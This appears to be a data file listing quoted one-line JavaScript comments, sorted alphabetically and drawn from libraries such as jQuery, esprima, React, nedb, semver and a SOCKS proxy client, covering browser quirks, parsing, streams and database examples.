"// Expose jQuery and $ identifiers, even in AMD"
"// Expose the API as global variables, unless an 'exports'"
"// ExpressionStatement and fails the hasParens test, because the"
"// ExpressionStatement, so special-case it first."
"// Extended JavaScript BN functions, required for RSA private ops."
"// External modules are also supported (if they use Node primitives, which they probably do)."
"// External users might find this function useful, but it is not necessary"
"// FE FF  UTF-16, big endian BOM"
"// FE FF 00 00  UCS-4, unusual octet order BOM (3412)"
"// FF FE  UTF-16, little endian BOM"
"// FF FE 00 00  UTF-32, little-endian BOM"
"// FF does not set `charCode` for the Enter-key, check against `keyCode`."
"// FF meanwhile throws on frame elements through ""defaultView.getComputedStyle"""
"// Failsafe, borrowed from jsZip"
"// Fall back to copying key by key. This assumes all keys have a value,"
"// Fallback for data views, maps, sets, and weak maps in IE 11 and promises in Node.js < 6."
"// Fast case, write everything using _writev()"
"// Fast-path, not in the spec"
"// Faster than running regex, if str starts with `<` and ends with `>`, assume it's HTML"
"// Fetch script content, execute it with DOM built around `parser.document` and"
"// Field 'system' on Mars, Earth, Jupiter now has value 'solar system'"
"// File Mode Pattern length not equals 5, eg: -arh-';};"
"// File not found or no Permission"";`"
"// File protocol always yields status code 0, assume 200"
"// File: protocol always yields status 0; see #8605, #14207"
"// Filter out listeners, which were not created in this sandbox"
"// Filter out the util module, it's inspect function is special"
"// Find a node with a given start, end, and type (all are optional,"
"// Find mappings for the ""aSourceFile"""
"// Find mappings for the ""sourceFile"""
"// Find next null character (if one is not found, default from above is used)"
"// Finish an AST node, adding `type` and `end` properties."
"// Firefox 3.0+ [xxx = 1, xXx = 1]"
"// First test, not reading when the readable is added."
"// First website failed,"
"// First, attempt to store a copy or reference of any"
"// First, detect invalid regular expressions."
"// First, get a generated `FindProxyForURL()` function,"
"// First, let's check if we're in an unusual parsing mode..."
"// First, split based on boolean or ||"
"// Fix IE bugs, see support tests"
"// Fixed `exec` here allows use of named backreferences, etc."
"// Fixed `exec` required for `lastIndex` fix, etc."
"// Fixed `replace` required for named backreferences, etc."
"// Fixed elements are offset from window (parentOffset = {top:0, left: 0},"
"// Fixes IE, Chrome, Firefox, Safari bug (last tested IE 9, Chrome 17, Firefox 11, Safari 5.1)"
"// Fixes IE, Opera bug (last tested IE 9, Opera 11.6)"
"// Fixes IE, Safari bug (last tested IE 9, Safari 5.1)"
"// Flags to track whether we are in a function, a generator."
"// Flash Player version >= published SWF version: Houston, we have a match!"
"// Flip backward selections, so we can set with a single range."
"// For ""expired"" we use 0"
"// For HTML, certain tags cannot have children. This has the same purpose as"
"// For HTML, certain tags should omit their close tag. We keep a whitelist for"
"// For HTML5 data-* attribute interop, we have to"
"// For NW apps, store data in the same directory where NW stores application data"
"// For UTF-8, a replacement character is added when ending on a partial"
"// For XHR2 non-text, let the caller handle it (gh-2498)"
"// For a given reconcile, look at which components did not actually"
"// For ambiguous cases, determine if a LexicalDeclaration (or only a"
"// For backwards compatibility, unroll NodePath instances into"
"// For best results, put code like"
"// For checkbox, fire native event so checked state will be right"
"// For computed properties we should skip the [ and ], and"
"// For cross-browser compatibility with ES3, convert [] to \b\B and [^] to [\s\S]."
"// For cross-browser consistency, don't fire native .click() on links"
"// For cross-domain requests, seeing as conditions for a preflight are"
"// For each element in the set, get the first element that matches the selector"
"// For example on Linux, the datafile will be ~/.config/nwtest/nedb-data/something.db"
"// For example, ^1.2.3-pr.1 desugars to >=1.2.3-pr.1 <2.0.0"
"// For fields that have default values, types.getFieldValue will return"
"// For functions that will be invoked using .call or .apply, we need to"
"// For instance, remote is in 2014 while local is still in 2013. In"
"// For methods which are defined more than once, call the existing"
"// For more details, please read http://esprima.org/doc/#booleantrap."
"// For more details, please read http://esprima.org/doc/#nestedternary"
"// For node.js v012.0 and iojs-v1.5.1, host is an object. And any existing localAddress is part of the connection name."
"// For node.js, we pick am3 with max dbits to 28."
"// For now, only warn when we have a suggested correction. This prevents"
"// For now, this is true - might change in the future."
"// For other native event types, do nothing."
"// For quickly matching children type, to test if can be treated as content."
"// For same-domain requests, won't change header if already provided."
"// For simplicity, reapply `defaultValue` if `multiple` is toggled."
"// For some reason that I've now forgotten, using divs didn't work"
"// For some reason typeof null is ""object"", so special case here."
"// For static pages, no need to put React ID and checksum. Saves lots of"
"// For the purposes of this example, we won't worry about functions"
"// For tokens that include more information than their type, the value"
"// Force the result to be held in this array, thus defeating any"
"// Forcibly trigger a chown on every entry, no matter what"
"// Forever detecting, till the end or until both model probers return eNotMe (handled above)"
"// Format -0 as '-0'. Strict equality won't distinguish 0 from -0,"
"// From Chromium // '\r', '\n' and '\0' should be treated as a terminator in"
"// From ES spec table of contents. Also, don't forget the Annex B additions."
"// From RFC 1928, Section 3: https://tools.ietf.org/html/rfc1928#section-3"
"// From now on, variable terms are as if we're in ""gtr"" mode."
"// Fully qualified element name, e.g. <svg:path> returns ""svg:path"""
"// Function (e.g., FunctionDeclaration, FunctionExpression, and"
"// Function is the supertype of FunctionExpression,"
"// FunctionDeclaration, ArrowExpression, etc."
"// FunctionExpression method values should be anonymous,"
"// Furthermore, buffers are only tested at most once per write(), so passing a very"
"// GEBCN buggy in quirks mode, match count is:"
"// Garbage in, garbage out some would say..."
"// Gecko does not error, returns false instead"
"// Generates a standardized token name (lowercase, with hyphens, spaces, and underscores removed)"
"// GeneratorExpression should be parenthesized with (...), ComprehensionExpression with [...]"
"// Get a regular expression object for this pattern-flag pair, or `null` in"
"// Get all comments that are either leading or trailing, ignoring any"
"// Get callback name, remembering preexisting value associated with it"
"// Get input, add round key"
"// Get out of our habit of using `window` inline, at least."
"// Get the parent of each element in the current set of matched elements,"
"// Get the value of an object property, taking object.type and default"
"// Get width or height on the element, requesting but not forcing parseFloat"
"// Gets hook for the prefixed version, then unprefixed version"
"// Given an array of nodes, remove any member that is contained by another."
"// Given its name, create the complete modifier function"
"// Go through every key on the object,"
"// Go through the array, only saving the items"
"// Go through the array, translating each of the items to their new values"
"// Got a ""function"" expression/statement,"
"// Group markup by `nodeName` if a wrap is necessary, else by '*'."
"// Guard against undefined ""subtract"", e.g., when used as in cssHooks"
"// HANDLE: $(""""), $(null), $(undefined), $(false)"
"// HANDLE: $(expr, $(...))"
"// HANDLE: $(expr, context)"
"// HANDLE: $(html, props)"
"// HFS, ext{2,3}, FAT do not, Node.js v0.10 does not"
"// HTML entities should already be decoded by the parser, so no need to decode them"
"// HTML, we want to make sure that it's a safe tag."
"// HTTP, HTTPS, or SOCKS proxy to use"
"// Hallo, world!\n': {"
"// Handle Promises/A+ spec, then could be a getter"
"// Handle iff the expected data type is ""jsonp"" or we have a parameter to set"
"// Handle: [ owner, key, value ] args"
"// Handle: [ owner, { properties } ] args"
"// Handles objects with the built-in `forEach`, arrays, and raw objects."
"// Hebrew model prober, the model prober forwards the call to the"
"// Hebrew. Disjointed from the model probers, the results of the HebrewProber"
"// HebrewProber is passed to the model probers as a helper ""Name Prober""."
"// HebrewProber to make the final decision. In the HebrewProber, the"
"// Hello, world!\n': {"
"// Hello, world!\n42': {"
"// Hello, world!\n\n//   Another hello\n42': {"
"// Here we use asap to wait until all updates have propagated, which"
"// Here, the underlying file is 3 lines long for only one document"
"// Hint to use ""Connection: close"""
"// Historically, SourceMapConsumer did not take the sourceMapURL as"
"// However, `1.2.4-alpha.notready` should NOT be allowed,"
"// However, if we're not ended, or reading, and the length < hwm,"
"// However, it will usually result in less memory allocation"
"// However, some Function.prototype methods cannot be overwritten,"
"// However, some cases require setting options to different"
"// Hyphen, followed by one or more dot-separated pre-release version"
"// ID optimization LTR, to reduce selection context searches"
"// ID optimization RTL, to reduce number of elements to visit"
"// IE 11 uses modern selection, but doesn't support the extend method."
"// IE 8 throws on Object.getOwnPropertyDescriptor(arguments, '')"
"// IE only: when a SWF is loading (AND: not available in cache) wait for the readyState of the object element to become 4 before removing it,"
"// IE throws exception if url is malformed, e.g. http://example.com:80x/"
"// IE10+ fire input events to often, such when a placeholder"
"// IE8 can throw ""Can't move focus to the control because it is invisible,"
"// IE8 does not implement `charCode`, but `keyCode` has the correct value."
"// IE8 throws ""Invalid argument."" if resetting shorthand style properties."
"// INVALID_CHARACTER_ERR exception and abort these steps."""
"// Ideally, we would use"
"// Ideally, you would take the body in the response"
"// Identical objects are equal. `0 === -0`, but they aren't identical."
"// Identifier node, we switch to interpreting it as a label."
"// If ""error"" event has no listeners,"
"// If ""name"" is an array of keys..."
"// If ""type"" variable is undefined, then ""GET"" method will be used."
"// If '/' concats with '/' or `<` concats with `!--`, it is interpreted as comment start"
"// If --no-deprecation is set, then it is a no-op."
"// If A is deeper, crawl up."
"// If B is deeper, crawl up."
"// If IndexedDB isn't available, we get outta here!"
"// If IndexedDB isn't available, we'll fall back to localStorage."
"// If Underscore is called as a function, it returns a wrapped object that"
"// If WebSQL methods aren't available, we can stop now."
"// If _read called its callback synchronously, then `reading`"
"// If _read pushed data synchronously, then `reading` will be false,"
"// If `method` throws, prefer to show that stack trace over any thrown"
"// If `rootNode.form` was non-null, then we could try `form.elements`,"
"// If `str` is undefined, act as a ""getter"""
"// If `true`, then connect to the proxy server over TLS."
"// If a component is unmounted before pending changes apply, it will still"
"// If a division operator appears in an expression position, the"
"// If a document's field is an array, matching it means matching any element of the array"
"// If a hook was provided, use that value, otherwise just set the specified value"
"// If a key with the spaces exists, use it."
"// If a normal DOM Ready event fired, decrement, and wait if need be"
"// If a number was passed in, add the unit (except for certain CSS properties)"
"// If a paste event occurs after a keypress, throw out the input"
"// If a port is specified explicitly, use it as is"
"// If a result was found, parse it from the serialized"
"// If a selector was specified, locate the right elements in a dummy div"
"// If a sort is defined, wait for the results to be sorted before applying limit and skip"
"// If a string URI/URL was given, parse it into a URL object"
"// If a symbolic link is encountered on Windows, all bets are off."
"// If a variable is not specified, place data values in local scope."
"// If aSourceFile is omitted, we will use the file property of the SourceMap"
"// If additional callbacks are queued before the queue is flushed, they"
"// If an array was passed in, assume that it is an array of form elements."
"// If an error happened, we need to rollback the insert on all other indexes"
"// If an error happened, we need to rollback the update on all other indexes"
"// If an error was raised, roll back changes in the inverse order"
"// If an existing socket is provided, use it to negotiate SOCKS handshake. Otherwise create a new Socket."
"// If an insert fails due to a unique constraint, roll back all inserts before it"
"// If an offset was given, check to see if we wrote beyond the current writeOffset."
"// If an offset was provided and its not the very end of the buffer, copy data into appropriate location in regards to the offset."
"// If an offset was provided, use it."
"// If an offset was provided, validate it."
"// If any part of a line is indentation-locked, the whole line"
"// If both nodes are subtypes of Expression, then we should be"
"// If called from an script element directly (during the first tick),"
"// If change and propertychange bubbled, we'd just bind to it like all the"
"// If checking deeply and vDef === this, then we only need to call"
"// If curCSS returns percentage, fallback to offset"
"// If data is available, append data to url"
"// If debug isn't set in LS, and we're in Electron, try to load $DEBUG"
"// If either the owner or a `ref` has changed, make sure the newest owner"
"// If enabled, skip leading hashbang line."
"// If error is not defined, the send has been completed, otherwise the error"
"// If event changes its type, use the special event handlers for the changed type"
"// If filters are necessary (rotation exists), create them"
"// If given host is 0.0.0.0, assume remote proxy ip instead."
"// If handleInvalidRegexFlag is true, an invalid flag in a regular expression"
"// If host is 0.0.0.0, set to proxy host."
"// If isFunction.check(from), and from is not a built-in"
"// If it fails, this function gets ""jqXHR"", ""status"", ""error"""
"// If it is a regular function declaration in sloppy mode, then it is"
"// If it is, jump forward by the specified size (round up to 512)"
"// If it receives a jQuery object, the first element is used"
"// If it's a named group, preserve the name. Otherwise, use the subpattern name"
"// If it's a spacebar character, assume that we have already handled"
"// If it's determined that a component should not update, we still want"
"// If it's not, then references will be corrected by frame/iframe code."
"// If it's the only child, treat the name as if it was wrapped in an array"
"// If jumping to earlier lines, reset columns to the ends of"
"// If jumping to later lines, reset columns to the beginnings"
"// If length is 1, that means that we need to schedule an async flush."
"// If listening to data, and it has not explicitly been paused,"
"// If localStorage isn't available, we get outta here!"
"// If localforage is ready and fully initialized, we can't set"
"// If name is '__proto__', and Object.defineProperty is available, define __proto__ as an own property on target"
"// If newNode.original node was set to null, reprint the node."
"// If newTree is undefined, that means its structure was not modified"
"// If nextSibling is non-null, set the referenceNode attribute to nextSibling"
"// If no ImportClause is present,"
"// If no argument is given, return whether or not list has callbacks attached."
"// If no characters are being inserted, no BeforeInput event should"
"// If no document is found, doc is null"
"// If no document is found, docs is equal to []"
"// If no location is provided, return the complete Lines object."
"// If no nodeType, this is expected to be an array"
"// If no numeric offset was given, we wrote to the end of the SmartBuffer so increment writeOffset."
"// If no offset was given, we wrote to the end of the SmartBuffer so increment writeOffset."
"// If no proxyUri is specified, then https://www.npmjs.com/package/proxy-from-env"
"// If no transport, we auto-abort"
"// If nobody prevented the default action, do it now"
"// If node is something like a window, document, or text node, none of"
"// If none found, seek a pair"
"// If none is provided, the default one can compare numbers, dates and strings"
"// If not a stateless component, we now render"
"// If not enough arguments are provided, the default value for the remaining fields"
"// If not found, move on"
"// If not, an exception will be thrown."
"// If not, create one"
"// If not, methods calling randombytes will throw."
"// If not, treat it as an array of { obj, query } where there needs to be at least one match"
"// If nothing was found internally, try to fetch any"
"// If obj is provided, the promise aspect is added to the object"
"// If our lower bound is less than our upper bound, we (1) partition the"
"// If path.value disagrees with parentValue[path.name], and"
"// If performUpdateIfNecessary happens to enqueue any new updates, we"
"// If pos.column does not exceed the indentation amount, then"
"// If previous iteration zeroed out, double until we get *something*."
"// If provided, this option will be passed along to the source map"
"// If removed from array, then decrease following items' keys."
"// If request was aborted inside a prefilter, stop there"
"// If request was aborted inside ajaxSend, stop there"
"// If resolveValues consist of only a single Deferred, just use that."
"// If root is an inclusive ancestor of next, set the referenceNode"
"// If seed is empty or no tokens remain, we can return early"
"// If selected Socks v5 auth method is no auth, send final handshake request."
"// If selected Socks v5 auth method is the custom_auth_method, send custom handshake."
"// If selected Socks v5 auth method is user/password, send auth handshake."
"// If selected element isn't a tag, move on"
"// If selector defined, determine special event api type, otherwise given type"
"// If self.tunnelOverride is set (the user specified a value), use it."
"// If set returns undefined, fall back to normal setting"
"// If setEncoding(null), decoder.encoding equals utf8"
"// If sock is undefined, assign it here."
"// If spaces are odd number, above pattern is considered."
"// If successful, handle type chaining"
"// If target is omitted, writes into ajaxSettings."
"// If the _sourcesContents map is empty, set the property to null."
"// If the app is running inside a Google Chrome packaged webapp, or some"
"// If the array expression ends with a hole, that hole"
"// If the array is large and already in sort order, pass `true`"
"// If the browser doesn't supply us with indexOf (I'm looking at you, **MSIE**),"
"// If the callback needs to know the value of i, call"
"// If the checksum is invalid, that's our position to start writing"
"// If the code includes a valid, prologue position"
"// If the current capture has a name, preserve the name"
"// If the data starts with BOM, we know it is UTF"
"// If the date is in the future (less than an hour from now), year"
"// If the date is in the past but no more than 6 months old, year"
"// If the delimiter matched an empty string, avoid an infinite loop"
"// If the destination is HTTPS, tunnel."
"// If the difference is below this, don't rely at all on the model score distance."
"// If the difference is below this, don't rely solely on the final letter score distance."
"// If the element has a class name or if we're passed `false`,"
"// If the error handler throws, it is not catchable and it"
"// If the final letter score distance is dominant enough, rely on it."
"// If the function hasn't returned already, we're confident that"
"// If the fx queue is dequeued, always remove the progress sentinel"
"// If the index of `child` is less than `lastIndex`, then it needs to"
"// If the input is a non-prerelease version, this acts the same as"
"// If the leading space contains newlines, then replace it"
"// If the leading space contains no newlines, then we want to"
"// If the next field is an integer, return only this item of the array"
"// If the node and offset values are the same, the selection is collapsed."
"// If the node has any comments, their locations might contribute to"
"// If the node has been found to be unique, re-insert it."
"// If the nodes are siblings, we can do a quick check"
"// If the only part of the root that is left is the scheme (i.e. http://,"
"// If the options argument is an object, we use it to set values."
"// If the original range is shorter than the simplified one, return that."
"// If the parent and child instances have a common owner ancestor, start"
"// If the parent node has type DeclareExportDeclaration, then it"
"// If the parent node is an export declaration, it will be"
"// If the preceding token was a descendant combinator, insert an implicit any-element `*`"
"// If the previous token is a dot, this does not apply because the context-managing code already ignored the keyword"
"// If the request succeeds, this function gets ""data"", ""status"", ""jqXHR"""
"// If the response content is being decoded, the Content-Encoding header"
"// If the selector is sufficiently simple, try using a ""get*By*"" DOM method"
"// If the simple way fails, read from inside an iframe"
"// If the source was empty, some parsers give loc.{start,end}.line"
"// If the super class is an expression, we need to memoize the output of the"
"// If the trailing space contains newlines, then replace it"
"// If the trailing space contains no newlines, then we want to"
"// If the user unpiped during `dest.write()`, it is possible"
"// If the user uses them, then switch into old mode."
"// If the value is null (e.g., no specified value or after initial mount)"
"// If the writable side ended, then we're ok."
"// If there are functions bound, to execute"
"// If there are no quasi elements, then there is nothing to fix."
"// If there is a unique constraint on field 'a', this will fail"
"// If there is already a '_' parameter, set its value"
"// If there is an error parsing the URL, assume it is crossDomain,"
"// If there is no closing brace, make the node span to the start"
"// If there is no value set (e.g. `undefined`, `null`), then return nothing"
"// If there was a parsing error, it would have been caught."
"// If there was an error, err is not null"
"// If there was an error, this function would be skipped."
"// If there was no visitor method to call, visit the children of"
"// If there's a baseUrl, then use it as the base URL (i.e. uri must be"
"// If there's a remainder, just add whatever is left"
"// If there's more than one initial capital letter, lower-case"
"// If there's no constructor method specified in the class body, create an"
"// If there's only one initial capital letter, just lower-case it."
"// If this Def is already buildable, update self.buildParams and"
"// If this flag is set to constants.True, detection is done and conclusion has been made"
"// If this flag is set to true, detection is done and conclusion has been made"
"// If this is a DOM element, try to get the outer HTML."
"// If this is a controlled radio button group, forcing the input that"
"// If this is a noop like .hide().hide(), restore an overwritten display value"
"// If this is a positional/relative selector, check membership in the returned set"
"// If this is a pre-major version, bump up to the same major version."
"// If this is a pre-minor version, bump up to the same minor version."
"// If this is a strict mode function, verify that argument names"
"// If this is already a prerelease, it will bump to the next version"
"// If this is not a pre-release version, it will increment the patch."
"// If this throws again, the error will bubble up (and can be caught by a higher error boundary)."
"// If this.traverse still hasn't been called, visit the"
"// If traditional, encode the ""old"" way (the way 1.3.2 or older"
"// If true, will turn on the underlying sockets TCP_NODELAY option."
"// If u flag is given, this returns the code point at the index (it combines a surrogate pair)."
"// If upsert option is set, check whether we need to insert the doc"
"// If url is an object, simulate pre-1.5 signature"
"// If using CONNECT, the client is now in the established state."
"// If using a custom auth method, specify the type here. If this is set, ALL other custom_auth_*** options must be set as well."
"// If using an escape character, advance to the delimiter's next starting position,"
"// If using innerHTML throws an exception, use the fallback method"
"// If value is a function, invoke it and return its value"
"// If we already have the right measurement, avoid augmentation"
"// If we are collecting the tokens, don't grab the next one yet."
"// If we are currently composing (IME) and using a fallback to do so,"
"// If we are going to the end, we want to run all the tweens"
"// If we aren't using plain objects, optionally prefix keys that would overwrite object prototype properties"
"// If we aren't using plain objects, optionally prefix keys"
"// If we can parse it, it's a valid absolute URL."
"// If we couldn't infer the Def associated with the given value,"
"// If we do, and either it's flowing, or it has never had any data"
"// If we do, it will only be ready once loadDatabase is called"
"// If we don't have a context, maybe we have a root, from loading"
"// If we don't know, then assume that we are waiting for one."
"// If we don't, then we definitely can handle more data."
"// If we get here before consuming all the bytes, then that is a"
"// If we get something that is not a buffer, string, null, or undefined,"
"// If we had tested against ""Mars"" docs would be empty because we are matching against a specific array element"
"// If we had used a fruit not in the array, e.g. 'banana', it would have been added to the array"
"// If we have a postFinder, or filtered seed, or non-seed postFilter or preexisting results,"
"// If we have an array of values (e.g. `<select multiple>`), return an array of key/value pairs"
"// If we have data, let's convert it"
"// If we have elements to modify, make the request"
"// If we have enough data to process the next step in the SOCKS handshake, proceed."
"// If we have memory from a past run, we should fire after adding"
"// If we have no .loc information for oldNode, then we won't"
"// If we have no .loc information for oldNode, then we"
"// If we have nothing in the buffer, then we want to know"
"// If we haven't returned by now, then the 'async' keyword was not"
"// If we include width, step value is 1 to do all cssExpand values,"
"// If we insert a new document { _id: 'id6', fruits: ['apple', 'orange', 'pear'] } in the collection,"
"// If we return false, then we need a drain event, so set that flag."
"// If we saw typeName earlier in the breadth-first traversal,"
"// If we still don't have a context, return"
"// If we tried to read() past the EOF, then emit end on the next tick."
"// If we're asking for more than the current hwm, then raise the hwm."
"// If we're asking for more than the target buffer level,"
"// If we're here with a time that is more than 6 months old, there's"
"// If we're in Chrome or Firefox, provide a download link if not installed."
"// If we're in IE8, check to see if we are in compatibility mode and provide"
"// If we're in an ES6 environment, make parsers iterable"
"// If we're not waiting on anything, resolve the master"
"// If we're switching from children to content/html or vice versa, remove"
"// If we're updating to null or undefined, we should remove the property"
"// If we're warning about an invalid (non-parent) ancestry, add '...'"
"// If we've already got an array, just append."
"// If we've reached the last proxy in the chain, the destination is the actual destination, otherwise it's the next proxy."
"// If you are using a JS minifier that mangles parameter names, `autoInject`"
"// If you choose to use recast.builders to construct new AST nodes, all builder"
"// If you decide to catch this exception and stop it from propagating,"
"// If you have no idea what ASN.1 or BER is, see this:"
"// If you pass the wrong type of arguments, or fail to pass enough"
"// If you set a process.env field to null or undefined, it gets cast to the"
"// If you upsert with a modifier, the upserted doc is the query modified by the modifier"
"// If you want to override the quotes used in string literals, specify"
"// If you want to print trailing commas in object literals,"
"// If you want to use a different branch of esprima, or any other"
"// If you want, you can extend native methods so you don't have to worry about this"
"// If you're updating this function definition, please also update any"
"// Immediate errors can also be handled with `try...catch`, but **note** that"
"// Immediately after `j` is incremented in this loop, the following hold"
"// Implement an async ._write(chunk, cb), and it'll handle all"
"// Implement an async ._write(chunk, encoding, cb), and it'll handle all"
"// Implicit octal, unless there is a non-octal digit."
"// In CSS3, :checked should return both checked and selected elements"
"// In Firefox, range.startContainer and range.endContainer can be ""anonymous"
"// In IE, errors have a single `stack` property, or if they are vanilla `Error`,"
"// In IE8, `mountAt` is a host object and doesn't have `hasOwnProperty`"
"// In IE8, we can capture almost all .value changes by adding a"
"// In IE9+, we have access to composition events, but the data supplied"
"// In IE9, reads to any property (e.g. status) off of an aborted XHR will"
"// In IE9-11, propertychange fires for most input events but is buggy and"
"// In Node.JS, `module` is a predefined object, which makes the QUnit `module` definitions fail"
"// In `return` (and `break`/`continue`), the keywords with"
"// In case of <template> we should pass its ""template contents"" fragment as a serialization root if we have one"
"// In case you didn't know, the caught parameter shadows any variable"
"// In certain cases it's possible for targetLoc.{start,end}.column"
"// In early versions of node, obj['__proto__'] is buggy when obj has"
"// In either case, we don't want to call the event handler if the value"
"// In email addresses, only the domain name should be punycoded. Leave"
"// In fact, all XRegExps are RegExps and work perfectly with native methods"
"// In modern browsers (i.e., not IE8 or IE9), the input event is exactly"
"// In ms, an upper bound for the reload time used to check createdAt and updatedAt"
"// In other words, `node.right` shouldn't contain logical expressions in order to check the mixed error."
"// In particular, this system allows for circular and forward definitions."
"// In principal, you could also find out the number of preceding siblings"
"// In reality, path.parent is the grandparent of path:"
"// In streams that never have any data, and do push(null) right away,"
"// In that case, the user has opted out of path protections"
"// In that case, we dilute the color to make the line look thinner."
"// In the case of any other error, just see if there's a dir there"
"// In the case of any other error, just see if there's a dir"
"// In: [1, 2, 3,]"
"// Incidentally, this tests that obj was not modified"
"// Incorporate the offset, then check against cycle size"
"// Increase `delta` enough to advance the decoder's <n,i> state to <m,0>,"
"// Incrementing an initially-string ""0"" `i` allows `i` to remain a string only in that"
"// Indexed by field name, dot notation can be used"
"// IndexedSourceMapConsumer.prototype.sourceContentFor. In that case, we"
"// Init the element's event structure and main handler, if this is the first"
"// Initialize arcfour context from key, an array of ints, each from [0..255]"
"// Initialize the config, saving the execution queue"
"// Insert doc has two new fields, _id and createdAt"
"// Insert in the internal tree, update the pointer to the root if needed"
"// Inspired by require(""ast-types"").NodePath.prototype.needsParens, but"
"// Integer division by 2, mod q"
"// Integer, meaning increasing sequence starting with prev character."
"// Intentional (non-timeout) abort is supposed to preserve partial response,"
"// Internal instances should fully constructed at this point, so they should"
"// Invalid URI: it may generate lot of bad errors, like 'TypeError: Cannot call method `indexOf` of undefined' in CookieJar"
"// Invoke `renewToken` when the click event is fired, but not more than once every 5 minutes."
"// Invoke `sendMail` when clicked, debouncing subsequent calls."
"// Invoke the callback on just the original child paths, regardless of"
"// Invokes interceptor with the obj, and then returns obj."
"// Is a given array, string, or object empty?"
"// It also calls `Buffer.concat()` at the end, which may be convenient"
"// It is a full dirname, strip trailing slash"
"// It is forgiving, closer to standard UTF-7 (for example, '-' is optional at the end)."
"// It is not necessary to receive all data to draw conclusion. For charset detection,"
"// It is possible for the path to be above the root. In this case, simply"
"// It needs to return a negative number if a is less than b,"
"// It should not fail on enosys ever, as this just indicates"
"// It would only be possible if we had proper getters/setters for every event handler, which we don't right now."
"// It'd be very memory-expensive in most cases, though."
"// It's a high surrogate, and there is a next character."
"// It's an unmatched surrogate; only append this code unit, in case the"
"// It's especially important to clear out the listeners here because document.close() causes a ""load"" event to"
"// It's impossible to fix without knowing about the server's timezone,"
"// It's not an error to finalize a type more than once, but only the"
"// It's not dominant enough, try to rely on the model scores instead."
"// It's possible that node is newly-created (not parsed by Esprima),"
"// Item is non-scalar (array or object), encode its numeric index."
"// Iterate backwards through tiesToBreak, examining the gaps"
"// Iterate over all defined fields of an object, including those missing"
"// Iterate until either we run out of mappings, or we run into"
"// Iterator will provide entry [k,v] tuples rather than values."
"// JIS X 0208 - Main set of 6879 characters, placed in 94x94 plane, to be encoded by 2 bytes. "
"// JIT'd JS is rather slow *and* loses JIT type information, resulting in"
"// JS multiply ""overflows"" differently from C/C++, so care is needed here."
"// JSON.stringify can throw, emit an error on that"
"// JavaScript micro-templating, similar to John Resig's implementation."
"// Jobs run automatically. If you want a callback when all are done,"
"// Just for fun, because addition is commutative:"
"// Keep both the (mapped) and old keys if they differ, just as"
"// Keep track of which events have ever been used, for event optimization"
"// Key not found, no modification"
"// Key: """" Value: {""a"":1,""o"":""[Circular]""}"
"// Key: ""a"" Value: 1"
"// Key: ""o"" Value: ""[Circular]"""
"// KeyPress is deprecated, but its replacement is not yet final and not"
"// Keys separate source (or catchall ""*"") and destination types with a single space"
"// Kind of weird to have a default max of Infinity, but oh well."
"// LOAD_NODE_MODULES(X, START)"
"// LOAD_PACKAGE_EXPORTS(X, DIR)"
"// LOAD_PACKAGE_IMPORTS(X, DIR)"
"// LOAD_PACKAGE_SELF(X, DIR)"
"// Leading and non-escaped trailing whitespace, capturing some non-whitespace characters preceding the latter"
"// Leave this path cached as parentCache[this.name], even though"
"// Left is not too small, don't change"
"// Legacy API: addRequest(req, host, port, path)"
"// Lengthen the array for every element, matched or not"
"// Let's use the same example collection as in the ""finding document"" part"
"// Like .check, except that failure triggers an AssertionError."
"// Like ModuleSpecifier, except type:""ExportSpecifier"" and buildable."
"// Like ModuleSpecifier, except type:""ImportSpecifier"" and buildable."
"// Like Object.keys, but aware of what fields each AST type should have."
"// Likewise, path.parentPath is named for the property by which"
"// Likewise, some parsers accidentally include the } that follows"
"// Line comment starts with '//' (char #47, char #47)."
"// Lines objects are immutable, so it's perfectly adequate to"
"// Logical Hebrew - ""windows-1255"" - normal, naturally ordered text."
"// Login Failed!"");"
"// Look for any active animations, and finish them"
"// Loop through the hierarchy, in case there's any nested components."
"// M, m, patch, prerelease, build"
"// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN"
"// Make ""aSourceFile"" relative if an absolute Url is passed."
"// Make ""sourceFile"" relative if an absolute Url is passed."
"// Make sure that the ""type"" field was filled automatically."
"// Make sure that the handler has a unique ID, used to find/remove it later"
"// Make sure that this path refers specifically to a Node, rather than"
"// Make sure we add a ""../"" for each component we removed from the root."
"// Make the changes, replacing each non-ignored context element with the new content"
"// Make this explicit, since user can override this through ajaxSetup (#11264)"
"// Margin is only for outerHeight, outerWidth"
"// Mars document now is { _id: 'id1', system: 'solar', inhabited: false"
"// Meaning is ""at least and backwards compatible with"""
"// Meaning is ""reasonably at or greater than"""
"// Mimic old behavior, could throw but didn't pass a test."
"// Missing scheme in proxy, default to the requested URL's scheme."
"// Modify $obj, Do not return"
"// Modular reduction using ""classic"" algorithm"
"// Most of the time, the content has ASCII chars (U+00**), but the opposite (U+**00) is uncommon."
"// Multibyte codec. In this scheme, a character is represented by 1 or more bytes."
"// Multiple visitors may be applied at once, so an"
"// Must force callback to be called on nextTick, so that we don't"
"// Must reset `isInsideConstructor`, even if a `trigger` or `handler` throws"
"// N milliseconds. If `immediate` is passed, trigger the function on the"
"// N=4000, 2.5s"
"// N=4000, 26.5s"
"// N=4000, 47.8s then crash, can't get string (with N=5000 crash happens on second pass)"
"// N=4000, 8.0s"
"// N=5000, 108s"
"// N=5000, 137s"
"// N=5000, 141s"
"// N=5000, 169s"
"// N=5000, 18s"
"// N=5000, 208s"
"// N=5000, 281s"
"// N=5000, 350s"
"// N=5000, 69s"
"// N=50000, 0.5s"
"// N=50000, 0.7s"
"// NB: In an Electron preload script, document will be defined but not fully"
"// NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,"
"// NOTE: Advanced use-case, for normal use see 'formData' usage above"
"// NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount`"
"// NOTE: menuitem's close tag should be omitted, but that causes problems."
"// NOTE: per https://heycam.github.io/webidl/#Global, all properties on the Window object must be own-properties."
"// Naive implementation, but it works because CESU-8 is especially easy"
"// Name,Type,Length,Not Null,Key,Auto Increment"
"// Named function, e.g. function f(){} /42/"
"// Native objects stringify to [object File], [object Blob], [object FormData], etc."
"// Need to wait for the ""socket"" event to re-play the ""data"" events."
"// Needed because $( selector, context ) becomes $( context ).find( selector )"
"// Nested array in a subdocument of an array (yay, inception!)"
"// Never move original objects, clone them"
"// New HTML5 attribute values (e.g., ""search"") appear with elem.type === ""text"""
"// No HAS_SIDE_EFFECTS logic here, only `value` has it and is string."
"// No argument, return index in parent"
"// No baseName, so this is ID is resolved relative"
"// No more remaining code, continue"
"// No more than 30ms should have elapsed (worst case, if there is a flush)"
"// No need to check if the test was already performed, though."
